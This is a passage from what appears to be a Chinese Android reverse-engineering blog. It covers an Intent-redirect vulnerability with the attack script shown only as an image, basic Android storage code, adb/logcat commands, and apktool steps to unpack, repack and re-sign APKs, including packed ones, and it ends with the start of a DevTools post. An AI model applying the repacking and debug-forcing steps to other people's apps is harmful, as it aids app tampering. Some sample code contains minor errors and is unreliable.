title="Intent重定向导致launchAnyWhere漏洞"></a>Intent重定向导致launchAnyWhere漏洞</h3><p>通过一定的方法可以访问未导出的组件，我们将这种漏洞成为<code>launchAnyWhere</code>漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p>首先是不可导出组件PrivateActivity:  可导出的组件：WebView2Activity</p><p>WebView2Activity关键代码如下<img src="2025-01-15-Android基础知识/905443_UTXVH9Q5AYRTWVH.png" alt="image-20220730125041041"></p><p>PrivateActivity关键代码如下：</p><p><img src="2025-01-15-Android基础知识/905443_MMQXRU274JXCJRT.png" alt="image-20220730125108657"></p><p>攻击脚本<br><img src="2025-01-15-Android基础知识/905443_W4Q2EBR4BJMXG2R.png" alt="image-20220730125254413"></p><h2 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h2><h3 id="Android中的数据存储Preference"><a href="#Android中的数据存储Preference" class="headerlink" title="Android中的数据存储Preference"></a>Android中的数据存储Preference</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//保存配置文件</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        SharedPreferences <span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sp.edit();</span><br><span class="line">        editor.putInt(<span class="string">&quot;player_level&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        editor.putString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;myname&quot;</span>);</span><br><span class="line">        editor.commit();</span><br><span class="line">        <span class="comment">//读取文件</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        <span class="type">String</span> <span class="variable">player_name</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;noname&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">player_level</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_level&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;player_name:&quot;</span>+player_name+<span class="string">&quot;player_level:&quot;</span>+player_level);</span><br><span class="line">                </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h3 id="Android中的文件操作File，自定义文件格式"><a href="#Android中的文件操作File，自定义文件格式" class="headerlink" title="Android中的文件操作File，自定义文件格式"></a>Android中的文件操作File，自定义文件格式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">button = findViewById(R.layout.button2);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> getFilesDir();</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,dir.getAbsolutePath()); <span class="comment">//打印绝对路径 /data/user/包名/files</span></span><br><span class="line">        <span class="comment">//创建目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir.getAbsolutePath()+<span class="string">&quot;/newDir&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file.exits())&#123;</span><br><span class="line">            file.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建文件</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">mydat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/mydat.dat&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!mydat.exits())&#123;</span><br><span class="line">           mydat.createNewFile();   </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//FileOutputStream fos = openFileOutput(&quot;mydata.dat&quot;,MODE_PRIVATE);</span></span><br><span class="line">            <span class="comment">//上面这个代码等价于 创建一个文件并new一个输入流</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//写入文件</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(mydat);</span><br><span class="line">            fos.write(<span class="string">&quot;hello&quot;</span>.getBytes() );</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(fos);</span><br><span class="line">            dos.writeInt(<span class="number">100</span>);</span><br><span class="line">            dos.writeFloat(<span class="number">3.5f</span>);</span><br><span class="line">            fos.close();</span><br><span class="line">            dos.close();</span><br><span class="line">            <span class="comment">//读取文件</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> openFileInput(<span class="string">&quot;mydata.dat&quot;</span>);</span><br><span class="line">            <span class="type">byte</span> buff[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>];</span><br><span class="line">            fis.read(buff,<span class="number">0</span>,<span class="number">5</span>);<span class="comment">//读取长度5   fis.read(buff);</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buff);</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(fis);</span><br><span class="line">            <span class="type">int</span> <span class="variable">int_value</span> <span class="operator">=</span> dis.readInt();</span><br><span class="line">            <span class="type">float</span> <span class="variable">float_value</span> <span class="operator">=</span> dis.readFloat();</span><br><span class="line">            dis.close();</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="comment">//遍历文件</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">fileEnum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/data/&quot;</span>+getPackageName());</span><br><span class="line">            File[] files = fileEnum.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File f : files)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,f.getAbsolutePath());           </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//随机读写文件 </span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(<span class="string">&quot;mydata.dat&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.seek(<span class="number">4</span>);</span><br><span class="line">            randomAccessFile.readInt();                      </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Android中的数据库SQLite"><a href="#Android中的数据库SQLite" class="headerlink" title="Android中的数据库SQLite"></a>Android中的数据库SQLite</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SQL语法进行</span></span><br><span class="line">button = findViewById(R.layout.button3);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> openOrCreateDatabase(<span class="string">&quot;student&quot;</span>,MODE_PRIVATE,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//增加 删除 修改 查阅</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//db.execSQL(&quot;CREATE TABLE T_STUDENT (SID VARCHAR(50) PRIMARY KEY, SNAME VARCHAR(50))&quot;);</span></span><br><span class="line">            db.execSQL(<span class="string">&quot;INSERT INTO T_STUDENT VALUES(&quot;</span>S001<span class="string">&quot;,&quot;</span>张三<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            <span class="comment">//查询</span></span><br><span class="line">            <span class="comment">//Cursor cursor = db.query(&quot;T-STUDENT&quot;,null,null,null,null,null,&quot;sid desc&quot;);</span></span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(<span class="string">&quot;SELECT *FROM T_STUDENT&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            cursor.moveToFirst();</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">sid</span> <span class="operator">=</span> cursor.getString(<span class="number">0</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sname</span> <span class="operator">=</span> cursor.getString(<span class="number">1</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(SQLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不使用sql语法</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">valuse.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S002&quot;</span>);</span><br><span class="line">valuse.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">db.insert(<span class="string">&quot;T_student&quot;</span>,<span class="literal">null</span>,values);</span><br><span class="line">db.delete(<span class="string">&quot;T_STUDENT&quot;</span>,<span class="string">&quot;SID=? sname=?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;s001&quot;</span>,<span class="string">&quot;张三&quot;</span>&#125; );    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sdcard</span></span><br><span class="line">button = findViewById(R.layout.button4);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//获取sdcard路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="type">File</span> <span class="variable">newFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/Download/mysd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            newFile.createNewFile();         </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;          </span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p> 配置文件中给用户权限：<img src="2025-01-15-Android基础知识/image-20231026205554596.png" alt="image-20231026205554596"></p><h2 id="使用NDK编译"><a href="#使用NDK编译" class="headerlink" title="使用NDK编译"></a>使用NDK编译</h2><ul><li>编译Hello.c文件</li></ul><p>i686-linux-android16-clang -c -o Hello.o Hello.c</p><p>i686-linux-android16-clang  -o Hello Hello.o</p><ul><li>使用makefile编译，编译notepad.exe</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link /OUT:notepad<span class="selector-class">.exe</span> mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line"></span><br><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">cl /c mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">cl /c mou2<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">cl /c notepad.c</span><br></pre></td></tr></table></figure><ul><li>对上面使用变量赋值，可维护性</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">OBJECTS := mou1.obj mou2.obj notepad.obj</span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad.exe</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.exe:<span class="variable">$(OBJECTS)</span></span></span><br><span class="line">link <span class="variable">$(LINK_FLAGS)</span> <span class="variable">$(OBJECTS)</span></span><br><span class="line"></span><br><span class="line"><span class="section">mou1.obj:mou1.c mou1.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> mou1.c</span><br><span class="line"></span><br><span class="line"><span class="section">mou2.obj:mou2.c mou2.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> mou2.c</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.obj:notepad.c</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> notepad.c</span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line">del *.obj</span><br></pre></td></tr></table></figure><ul><li>多用户编辑</li></ul><p>新建两个mou1.mk mou2.mk</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">makefile中</span><br><span class="line"></span><br><span class="line">OBJECTS := *<span class="selector-class">.obj</span></span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link $(LINK_FLAGS) $(OBJECTS)</span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) notepad<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">include mou1<span class="selector-class">.mk</span></span><br><span class="line">include mou2<span class="selector-class">.mk</span></span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line"><span class="selector-tag">del</span> *<span class="selector-class">.obj</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou1.mk中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou2.mk中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Android目录"><a href="#Android目录" class="headerlink" title="Android目录"></a>Android目录</h1><ol><li><strong>data/data目录</strong><br>存放用户apk数据的目录，每个apk都有自己的目录，以包名命名，就是在data/data目录下，会产生一个跟Package一样的目录，这是一个私有目录，app只能访问各自的目录，除非root权限。</li><li><strong>data/app</strong><br>用户安装的app存放在这个目录下</li><li><strong>data/local/tmp</strong><br>临时目录，权限比较大</li><li><strong>system/app</strong><br>存放系统自带的app</li><li><strong>system/lib system/lib64</strong><br>存放app用到的so文件</li><li><strong>system/bin</strong><br>存放shell命令</li><li><strong>system/framework</strong><br>Android系统所用到的框架，如一些jar文件，XposedBridge.jar</li><li>sd卡目录，不管手机有没有存储卡都会有这个目录，app操作sd卡需要申请权限<br>/sdcard -&gt; /storage/self/primary<br>/mnt/sdcard<br>/storage/emulated/0</li></ol><h1 id="AndroidStudio工程目录结构"><a href="#AndroidStudio工程目录结构" class="headerlink" title="AndroidStudio工程目录结构"></a>AndroidStudio工程目录结构</h1><p>gradle - &gt;  wrapper  - &gt;  gradle-wrapper.prperties  配置项目gr adle 版 本 </p><p>build.gradle  描述工程整体的编译规则</p><p>gradle.properties  gradle配置文件，一般无须改动 </p><p>local.properties 本机环境配置，SDK 、NDK 路径等 ，一般无须改动 </p><p>settings. gradle  配置哪些模块在一 起编译    include  ‘ : app ‘ 只编译app</p><p> app - &gt; build.gradle  描述当前模块的编译规则 </p><p>app - &gt;  build - &gt;  outputs - &gt;  apk - &gt;  debug/ release 生 成的apk的存放位置 </p><p>app - &gt;  build - &gt;  intermediates - &gt;  cmake - &gt;  debug/ release - &gt;  obj生成的so存放位置</p><p>libs  模块中使用了第 三方 jar的时 候 ，会放这里 </p><p>src - &gt;  main - &gt;  cpp   C/C ++ 代码 </p><p>src - &gt;  main - &gt;  java   Java代码 </p><p>src - &gt;  proguard- rules.proJava 代码混淆规则 </p><p>res - &gt;  drawable  用来放图片 </p><p>res - &gt;  layout  用来放布局文件 </p><p>res - &gt;  mipmap-hdpi  用来放应用图片 ，不同屏幕的适 配 图标 </p><p>res - &gt;  values    st r i ngs. xml 、 publ i c. xml </p><p>AndroidManifest.xml  清单文件，app的icon图标 、四大组件的注 册 、权限申请、指明程序入口</p><h1 id="adb常用命令"><a href="#adb常用命令" class="headerlink" title="adb常用命令"></a>adb常用命令</h1><p>adb help </p><p>adb version 显示adb版本和路径</p><p>adb start-server 启动server</p><p>adb kill-server 停止server</p><p> adb install -r xxx.apk 覆盖安装</p><p>adb uninstall 包名 卸载app</p><p>adb -s 设备名 shell 多设备时 指定设备</p><p>adb shell pm list package 显示包名</p><p>adb shell dumpsys activity top 查看手机当前界面的activity包路径</p><p>adb shell getprop ro.build.version.sdk 查看手机sdk版本</p><ul><li><p>这里直接安装会失败，这里的错误提示 <strong>INSTALL_FAILED_TEST_ONLY</strong> 表示是测试应用，所以这里安装需要指定一些参数才能安装 <code>adb install -g -t -r -d app-debug.apk</code></p></li><li><p>刷ro.debuggable=1</p><ul><li>magisk resetprop ro.debuggable 1  stop   start</li></ul></li></ul><h1 id="logcat常用命令"><a href="#logcat常用命令" class="headerlink" title="logcat常用命令"></a>logcat常用命令</h1><p>adb logcat -help  帮助文档</p><p>adb logcat    常规显示</p><p>adb logcat -c 清除日志</p><p>adb logcat -g 显示缓冲区大小</p><p>adb logcat -G 256M 修改缓冲区大小</p><p>adb logcat -v time 设置不同显示格式</p><p>adb logcat -v color 颜色显示</p><p>adb logcat -s 标签 过滤tag</p><p>adb install —abi armeabi-v7a xxx.apk</p><p>adb logcat |tee -a a.txt 日志显示到屏幕且写入txt中</p><p>ps -A | grep 进程名 先获取进程pid<br>adb logcat | findstr pid</p><p>adb shell dumpsys window | <a href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> - i mCurrentFocus 找到当前运行状态下app的进程名</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb tcpid <span class="number">5555</span></span><br><span class="line">adb connect 手机ip </span><br><span class="line"><span class="comment">//这样就可以不用连数据线了</span></span><br></pre></td></tr></table></figure><p>adb shell dumpsys window |grep mCurrentFocus 查看顶端前台应用的包名和activity名</p><p>dumpsys activity top</p><h1 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h1><p>pm -l 列出包名</p><p>pm -l | grep xx 调出包含 xx的结果</p><p>aapt dump badging apk名称 查看apk文件的详细信息</p><p>ps -e | grep package 查看指定包的进程号    </p><p>ps aux |grep -i xxx  显示进程信息</p><p>知道进程号可以进入进程号的路径下 cd /proc/进程号</p><p>cat status下有一个 TracePid</p><p>am start-activity package  启动app</p><p>pm uninstall package 卸载</p><h1 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h1><p><code>apktool d apk名字</code>  进行apk解包</p><p><code>apktool b ./app-debug/</code> 进行重打包(app-debug/下是apk文件的基本组成结构)</p><ul><li>进行重打包时 需要进行签名</li></ul><ol><li>生成证书   可以下载kse，运行kse.sh对证书进行查看</li></ol><p><code>keytool -genkeypair -alias mysigner -keyalg RSA -validity 40000 -keystore android.keystore</code></p><ol><li>使用命令查看app是否需要签名<br><code>apksigner verify -v --print-certs --in app名称</code></li><li>使用证书进行签名<br><code>apksigner sign --ks android.keystore --ks-key-alias mysigner --out 自定义一个apk名称 原先app名称</code></li></ol><p>第二中签名命令</p><p><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 2000 -keystore abc,key</code></p><p><code>jarsigner -verbose -keystore abc.keystore -signedjar xxx_patch.apk xxx.apk abc.keystore</code></p><p><strong>当对加固的apk进行重打包时</strong></p><ol><li>重打包时应该使用脱壳后原始apk的dex替换掉原来的壳dex</li><li>app在加固后的入口点变为壳的入口点，因此在重打包后还需要修改AndroidManifest.xml入口类</li></ol><p><em>具体命令如下</em></p><ol><li>apktool d xxx.apk -s 然后删除原始dex，并将脱壳后dex按文件大小依次命名classes.dex,classes2.dex </li><li>jadx打开包含管件类的dex文件 并搜索extends Application的代码，定位关键类，将反编译结果目录下AndroidManifest.xml清单文件内<Application>结点的android：name对应的值修改为找到的完整类名</li><li>对反编译后目录 apktool b xxx.apk 然后签名正常运行</li><li>然后再反编译修改smail 再打包签名即可实现功能</li></ol>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> 基本命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AST混淆与反混淆</title>
      <link href="/posts/95017dfa.html"/>
      <url>/posts/95017dfa.html</url>
      
        <content type="html"><![CDATA[<h1 id="AST混淆与解混淆"><a href="#AST混淆与解混淆" class="headerlink" title="AST混淆与解混淆"></a>AST混淆与解混淆</h1><h1 id="Web网站的调试与抓包分析"><a href="#Web网站的调试与抓包分析" class="headerlink" title="Web网站的调试与抓包分析"></a>Web网站的调试与抓包分析</h1><h2 id="Chrome开发者工具"><a href="#Chrome开发者工具" class="headerlink" title="Chrome开发者工具"></a>Chrome开发者工具</h2><p>打开方式：</p><ul><li>F12</li><li>ctrl+shift+I组合</li><li>右击网页页面，点击检查</li><li>在右上角三个点 ==》 更多工具</li><li>在浏览器中新建窗口，使用上述任意方法打开开发者工具，在切回要调试的界面</li></ul><h3 id="Elements面板"><a href="#Elements面板" class="headerlink" title="Elements面板"></a>Elements面板</h3><p>显示页面源码的DOM树，可以在这里进行增删改查。主要用来对页面进行修饰美化，它并不是源代码</p><p>获取源代码方式：</p><ul><li>右键 ==》查看源代码 或者 ctrl+u</li><li>source面板</li></ul><p>在Elements面板下断点(右击 ==》break on )</p><ul><li>子树修改：在节点子树发生修改时断点</li><li>属性修改：在节点属性发生修改时断点</li><li>移除节点：在节点被移除时发生断点</li></ul><h3 id="Console面板"><a href="#Console面板" class="headerlink" title="Console面板"></a>Console面板</h3><p>点击某个节点：</p><ul><li>$0：对当前选中的节点进行引用</li><li>$1：对上一次选中的节点进行引用</li><li>以此类推 一直回溯到$4</li></ul><p>CSS选择器语法引用节点</p><ul><li>复制需要定位的节点的selector，使用document.querySelector(“路径”)</li><li>如果要选择所有符合CSS选择器语法的节点document.querySelectorAll</li></ul><p>观察与检查事件监听器</p><ul><li>monitorEvents()：监听目标事件信息</li><li>unmonitorEvents()：停止监听</li><li>getEventListeners()：获取DOM节点的监听器</li></ul><p>monitorEvents()第一个参数是要监听的对象，第二个参数是要监听的事件字符串或者字符串数组</p><p>Elements面板的Event Listeners可以看监听器</p><h3 id="Source面板"><a href="#Source面板" class="headerlink" title="Source面板"></a>Source面板</h3><p>断点：如果表达式有多行，在其中手动一个断点，会断在下一个表达式上。</p><p>条件断点：表达式true才会断下</p><p>XHR/fetch Breakpoints：当xhr与url子串匹配时触发断点</p><p>如果想在xhr生命周期的某个阶段触发断点，可以在 Event Listener Breakpoints窗中查看XHR目录</p><h3 id="Application面板"><a href="#Application面板" class="headerlink" 